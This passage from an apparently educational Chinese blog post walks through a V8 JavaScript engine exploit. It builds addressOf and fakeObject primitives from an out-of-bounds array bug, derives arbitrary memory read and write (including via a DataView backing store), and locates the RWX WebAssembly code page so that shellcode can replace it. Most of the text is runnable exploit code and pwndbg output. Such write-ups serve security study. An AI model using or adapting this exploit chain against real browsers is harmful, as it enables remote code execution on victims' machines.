<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// read &amp; write anywhere</span></span><br><span class="line"><span class="comment">// 这是一块我们可以控制的内存</span></span><br><span class="line"><span class="keyword">var</span> fake_array = [				<span class="comment">//伪造一个对象</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj's elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="comment">// 任意地址读</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 任意地址写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>整合测试一下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();<span class="comment">//oob函数出来的就是map</span></span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;<span class="comment">//泄漏出来的地址-1才是真实地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//地址需要+1才是v8中的正确表达方式</span></span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××3.read &amp; write anywhere××××××××</span></span><br><span class="line"><span class="comment">// 这是一块我们可以控制的内存</span></span><br><span class="line"><span class="keyword">var</span> fake_array = [				<span class="comment">//伪造一个对象</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj's elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="comment">// 任意地址读</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 任意地址写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××4. 测试××××××××</span></span><br><span class="line"><span class="keyword">var</span> a = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>];</span><br><span class="line"><span class="keyword">var</span> address = addressOf(a);</span><br><span class="line"><span class="keyword">var</span> read = read64(address);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*]read 0x"</span>+hex(address)+<span class="string">":0x"</span>+hex(read));</span><br><span class="line">%DebugPrint(a);</span><br><span class="line">%SystemBreak();</span><br><span class="line">write64(address,<span class="number">0x01020304n</span>);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<p>创建一个对象，找到他的地址。</p>
<p>读取对象地址存储的内容，然后改写对象地址存储的内容。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">[*]read 0x000031f15738fa50:0x0000369d9e942ed9&#x2F;&#x2F;读取出来对象地址存的数据是0x0000369d9e942ed9</span><br><span class="line">0x31f15738fa51 &lt;JSArray[3]&gt;</span><br><span class="line">&#x2F;&#x2F;查看对象地址的内存，发现和读取出来的一样</span><br><span class="line">pwndbg&gt; telescope 0x000031f15738fa50</span><br><span class="line">00:0000│   0x31f15738fa50 —▸ 0x369d9e942ed9 ◂— 0x400002d1469d401 &lt;&#x3D;对象地址，存储的内容被读取</span><br><span class="line">01:0008│   0x31f15738fa58 —▸ 0x2d1469d40c71 ◂— 0x2d1469d408</span><br><span class="line">02:0010│   0x31f15738fa60 —▸ 0x31f15738fa29 ◂— 0x2d1469d414</span><br><span class="line"></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x000031f15738fa50</span><br><span class="line">00:0000│   0x31f15738fa50 ◂— 0x1020304				&lt;&#x3D;对象地址，存储的内容被改写</span><br><span class="line">01:0008│   0x31f15738fa58 —▸ 0x2d1469d40c71 ◂— 0x2d1469d408</span><br><span class="line">02:0010│   0x31f15738fa60 —▸ 0x31f15738fa29 ◂— 0x2d1469d414</span><br></pre></td></tr></table></figure>
<p>成功！！</p>
<h4 id="任意写改进"><a href="#任意写改进" class="headerlink" title="任意写改进"></a>任意写改进</h4><p>问题：通过上面的方式任意地址写，在写0x7fxxxx这样的高地址的时候会出现问题，地址的低位会被修改，导致出现访问异常。</p>
<p>解决：DataView对象中的<code>backing_store</code>会指向申请的<code>data_buf</code>（<code>backing_store</code>相当于我们的elements），修改<code>backing_store</code>为我们想要写的地址，并通过DataView对象的setBigUint64方法就可以往指定地址正常写入数据了。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> data_buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">var</span> data_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(data_buf);</span><br><span class="line"><span class="keyword">var</span> buf_backing_store_addr = addressOf(data_buf) + <span class="number">0x20n</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">writeDataview</span>(<span class="params">addr,data</span>)</span>&#123;</span><br><span class="line">    write64(buf_backing_store_addr, addr);</span><br><span class="line">    data_view.setBigUint64(<span class="number">0</span>, data, <span class="literal">true</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"[*] write to : 0x"</span> +hex(addr) + <span class="string">": 0x"</span> + hex(data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="浏览器运行shellcode：wasm"><a href="#浏览器运行shellcode：wasm" class="headerlink" title="浏览器运行shellcode：wasm"></a>浏览器运行shellcode：wasm</h3><blockquote>
<p>wasm是让JavaScript直接执行高级语言生成的机器码的一种技术。</p>
<p>使用：网站<a href="https://wasdk.github.io/WasmFiddle/：在线将C语言直接转换为wasm并生成JS配套调用代码。（左下角选择Code" target="_blank" rel="noopener">https://wasdk.github.io/WasmFiddle/：在线将C语言直接转换为wasm并生成JS配套调用代码。（左下角选择Code</a> Buffer，然后点击最上方的Build按钮，左下角生成了我们需要的wasm代码。）</p>
<p><img src="/2020/10/23/17-42/image-20201017005734798.png" alt="image-20201017005734798"></p>
<p>问题：wasm中只能运行数学计算、图像处理等系统无关的高级语言代码。所以不能直接在wasm中写入我们的shellcode，然后浏览器调用执行。</p>
<p>方案：结合漏洞将原本内存中的的wasm代码替换为shellcode，当后续调用wasm的接口时，实际上调用的就是我们的shellcode了。</p>
</blockquote>
<p>步骤：</p>
<p>1.首先加载一段wasm代码到内存中</p>
<p>2.然后通过addressOf找到存放wasm的内存地址</p>
<p>3.接着通过任意地址写原语用shellcode替换原本wasm的代码内容</p>
<p>4.最后调用wasm的函数接口即可触发调用shellcode</p>
<h4 id="寻找存放wasm代码的内存页地址"><a href="#寻找存放wasm代码的内存页地址" class="headerlink" title="寻找存放wasm代码的内存页地址"></a>寻找存放wasm代码的内存页地址</h4><p>通过Function—&gt;shared_info—&gt;WasmExportedFunctionData—&gt;instance，在instance+0x88的固定偏移处，就能读取到存储wasm代码的内存页起始地址。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//test.js，用debug版本调试</span></span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line">%DebugPrint(f);</span><br><span class="line">%SystemBreak();</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ gdb .&#x2F;d8 </span><br><span class="line">[...]</span><br><span class="line">pwndbg&gt; set args --allow-natives-syntax test.js </span><br><span class="line">pwndbg&gt; r</span><br><span class="line">[...]</span><br><span class="line">DebugPrint: 0x2c708e5dfab9: [Function] in OldSpace</span><br><span class="line"> - map: 0x07f1e5ac4379 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x2c708e5c2109 &lt;JSFunction (sfi &#x3D; 0x84e79c8039)&gt;</span><br><span class="line"> - elements: 0x1c0c1f4c0c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - function prototype: &lt;no-prototype-slot&gt;</span><br><span class="line"> - shared_info: 0x2c708e5dfa81 &lt;SharedFunctionInfo 0&gt;             &lt;&#x3D; shared_info</span><br><span class="line"> - name: 0x1c0c1f4c4ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line">[...]</span><br><span class="line">&#x2F;&#x2F;shared_info在Function+0x18的位置</span><br><span class="line">pwndbg&gt; telescope 0x2c708e5dfab9-1</span><br><span class="line">00:0000│   0x2c708e5dfab8 —▸ 0x7f1e5ac4379 ◂— 0x700001c0c1f4c01</span><br><span class="line">01:0008│   0x2c708e5dfac0 —▸ 0x1c0c1f4c0c71 ◂— 0x1c0c1f4c08</span><br><span class="line">... ↓</span><br><span class="line">03:0018│   0x2c708e5dfad0 —▸ 0x2c708e5dfa81 ◂— 0x5900001c0c1f4c09 	&lt;&#x3D; here(看最左边这个03:0018)</span><br><span class="line">04:0020│   0x2c708e5dfad8 —▸ 0x2c708e5c1869 ◂— 0x1c0c1f4c0f</span><br><span class="line">05:0028│   0x2c708e5dfae0 —▸ 0x84e79c0699 ◂— 0xd100001c0c1f4c15</span><br><span class="line">06:0030│   0x2c708e5dfae8 —▸ 0x3e5b7d3c2001 ◂— or     cl, byte ptr [rdi + rbx + 0xc]</span><br><span class="line">07:0038│   0x2c708e5dfaf0 —▸ 0x1c0c1f4c0bc1 ◂— 0x1c0c1f4c01</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x2c708e5dfa81</span><br><span class="line">0x2c708e5dfa81: [SharedFunctionInfo] in OldSpace</span><br><span class="line"> - map: 0x1c0c1f4c09e1 &lt;Map[56]&gt;</span><br><span class="line"> - name: 0x1c0c1f4c4ae1 &lt;String[#1]: 0&gt;</span><br><span class="line"> - kind: NormalFunction</span><br><span class="line"> - function_map_index: 144</span><br><span class="line"> - formal_parameter_count: 0</span><br><span class="line"> - expected_nof_properties: 0</span><br><span class="line"> - language_mode: sloppy</span><br><span class="line"> - data: 0x2c708e5dfa59 &lt;WasmExportedFunctionData&gt;					&lt;&#x3D; WasmExportedFunctionData</span><br><span class="line"> - code (from data): 0x3e5b7d3c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - function token position: -1</span><br><span class="line">[...]</span><br><span class="line">&#x2F;&#x2F;WasmExportedFunctionData在SharedFunctionInfo+0x8的位置</span><br><span class="line">pwndbg&gt; telescope 0x2c708e5dfa81-1</span><br><span class="line">00:0000│   0x2c708e5dfa80 —▸ 0x1c0c1f4c09e1 ◂— 0x700001c0c1f4c01</span><br><span class="line">01:0008│   0x2c708e5dfa88 —▸ 0x2c708e5dfa59 ◂— 0x100001c0c1f4c58	&lt;&#x3D; here(看最左边这个01:0008)</span><br><span class="line">02:0010│   0x2c708e5dfa90 —▸ 0x1c0c1f4c4ae1 ◂— 0x1c0c1f4c04</span><br><span class="line">03:0018│   0x2c708e5dfa98 —▸ 0x1c0c1f4c2a39 ◂— 0x1c0c1f4c13</span><br><span class="line">04:0020│   0x2c708e5dfaa0 —▸ 0x1c0c1f4c04d1 ◂— 0x1c0c1f4c05</span><br><span class="line">05:0028│   0x2c708e5dfaa8 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">07:0038│   0x2c708e5dfab8 —▸ 0x7f1e5ac4379 ◂— 0x700001c0c1f4c01</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x2c708e5dfa59</span><br><span class="line">0x2c708e5dfa59: [WasmExportedFunctionData] in OldSpace</span><br><span class="line"> - map: 0x1c0c1f4c5879 &lt;Map[40]&gt;</span><br><span class="line"> - wrapper_code: 0x3e5b7d3c2001 &lt;Code JS_TO_WASM_FUNCTION&gt;</span><br><span class="line"> - instance: 0x2c708e5df8c1 &lt;Instance map &#x3D; 0x7f1e5ac9789&gt;			&lt;&#x3D; instance</span><br><span class="line"> - function_index: 0</span><br><span class="line">&#x2F;&#x2F;instance在WasmExportedFunctionData+0x10的位置</span><br><span class="line">pwndbg&gt; telescope 0x2c708e5dfa59-1</span><br><span class="line">00:0000│   0x2c708e5dfa58 —▸ 0x1c0c1f4c5879 ◂— 0x500001c0c1f4c01</span><br><span class="line">01:0008│   0x2c708e5dfa60 —▸ 0x3e5b7d3c2001 ◂— or     cl, byte ptr [rdi + rbx + 0xc]</span><br><span class="line">02:0010│   0x2c708e5dfa68 —▸ 0x2c708e5df8c1 ◂— 0x71000007f1e5ac97	&lt;&#x3D; here(看最左边这个02:0010)</span><br><span class="line">03:0018│   0x2c708e5dfa70 ◂— 0x0</span><br><span class="line">... ↓</span><br><span class="line">05:0028│   0x2c708e5dfa80 —▸ 0x1c0c1f4c09e1 ◂— 0x700001c0c1f4c01</span><br><span class="line">06:0030│   0x2c708e5dfa88 —▸ 0x2c708e5dfa59 ◂— 0x100001c0c1f4c58</span><br><span class="line">07:0038│   0x2c708e5dfa90 —▸ 0x1c0c1f4c4ae1 ◂— 0x1c0c1f4c04</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pwndbg&gt; telescope 0x2c708e5df8c1-1+0x88</span><br><span class="line">00:0000│   0x2c708e5df948 —▸ 0x1864fd681000 ◂— movabs r10, 0x1864fd681260 &#x2F;* 0x1864fd681260ba49 *&#x2F;</span><br><span class="line">01:0008│   0x2c708e5df950 —▸ 0x6158a14e409 ◂— 0x71000007f1e5ac91</span><br><span class="line">02:0010│   0x2c708e5df958 —▸ 0x6158a14e679 ◂— 0x71000007f1e5acad</span><br><span class="line">03:0018│   0x2c708e5df960 —▸ 0x2c708e5c1869 ◂— 0x1c0c1f4c0f</span><br><span class="line">04:0020│   0x2c708e5df968 —▸ 0x2c708e5df9e9 ◂— 0x71000007f1e5aca1</span><br><span class="line">05:0028│   0x2c708e5df970 —▸ 0x1c0c1f4c04d1 ◂— 0x1c0c1f4c05</span><br><span class="line">... ↓</span><br><span class="line">pwndbg&gt; vmmap 0x1864fd681000</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">    0x1864fd681000     0x1864fd682000 rwxp     1000 0       +0x0</span><br></pre></td></tr></table></figure>
<p>所以，根据以上，可以编写代码自动查找该地址。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shared_info_addr = read64(f_addr + <span class="number">0x18n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_exported_func_data_addr = read64(shared_info_addr + <span class="number">0x8n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = read64(wasm_exported_func_data_addr + <span class="number">0x10n</span>) - <span class="number">0x1n</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = read64(wasm_instance_addr + <span class="number">0x88n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] leak rwx_page_addr: 0x"</span> + hex(rwx_page_addr));</span><br></pre></td></tr></table></figure>
<p>整合的调试代码如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××</span></span><br><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> BigUint64Array(buf);</span><br><span class="line"><span class="comment">// 浮点数转换为64位无符号整数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为浮点数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 64位无符号整数转为16进制字节串</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">i</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> i.toString(<span class="number">16</span>).padStart(<span class="number">16</span>, <span class="string">"0"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××2. addressOf和fakeObject的实现××××××××</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;<span class="string">"a"</span>: <span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">var</span> obj_array = [obj];</span><br><span class="line"><span class="keyword">var</span> float_array = [<span class="number">1.1</span>];</span><br><span class="line"><span class="keyword">var</span> obj_array_map = obj_array.oob();<span class="comment">//oob函数出来的就是map</span></span><br><span class="line"><span class="keyword">var</span> float_array_map = float_array.oob();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 泄露某个object的地址</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addressOf</span>(<span class="params">obj_to_leak</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    obj_array[<span class="number">0</span>] = obj_to_leak;</span><br><span class="line">    obj_array.oob(float_array_map);</span><br><span class="line">    <span class="keyword">let</span> obj_addr = f2i(obj_array[<span class="number">0</span>]) - <span class="number">1n</span>;<span class="comment">//泄漏出来的地址-1才是真实地址</span></span><br><span class="line">    obj_array.oob(obj_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> obj_addr;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fakeObject</span>(<span class="params">addr_to_fake</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    float_array[<span class="number">0</span>] = i2f(addr_to_fake + <span class="number">1n</span>);<span class="comment">//地址需要+1才是v8中的正确表达方式</span></span><br><span class="line">    float_array.oob(obj_array_map);</span><br><span class="line">    <span class="keyword">let</span> faked_obj = float_array[<span class="number">0</span>];</span><br><span class="line">    float_array.oob(float_array_map); <span class="comment">// 还原array类型以便后续继续使用</span></span><br><span class="line">    <span class="keyword">return</span> faked_obj;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ××××××××3.read &amp; write anywhere××××××××</span></span><br><span class="line"><span class="comment">// 这是一块我们可以控制的内存</span></span><br><span class="line"><span class="keyword">var</span> fake_array = [				<span class="comment">//伪造一个对象</span></span><br><span class="line">    float_array_map,</span><br><span class="line">    i2f(<span class="number">0n</span>),</span><br><span class="line">    i2f(<span class="number">0x41414141n</span>),<span class="comment">// fake obj's elements ptr</span></span><br><span class="line">    i2f(<span class="number">0x1000000000n</span>),</span><br><span class="line">    <span class="number">1.1</span>,</span><br><span class="line">    <span class="number">2.2</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取到这块内存的地址</span></span><br><span class="line"><span class="keyword">var</span> fake_array_addr = addressOf(fake_array);</span><br><span class="line"><span class="comment">// 将可控内存转换为对象</span></span><br><span class="line"><span class="keyword">var</span> fake_object_addr = fake_array_addr - <span class="number">0x30n</span>;</span><br><span class="line"><span class="keyword">var</span> fake_object = fakeObject(fake_object_addr);</span><br><span class="line"><span class="comment">// 任意地址读</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read64</span>(<span class="params">addr</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    <span class="keyword">let</span> leak_data = f2i(fake_object[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">return</span> leak_data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 任意地址写</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">write64</span>(<span class="params">addr, data</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    fake_array[<span class="number">2</span>] = i2f(addr - <span class="number">0x10n</span> + <span class="number">0x1n</span>);</span><br><span class="line">    fake_object[<span class="number">0</span>] = i2f(data);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span 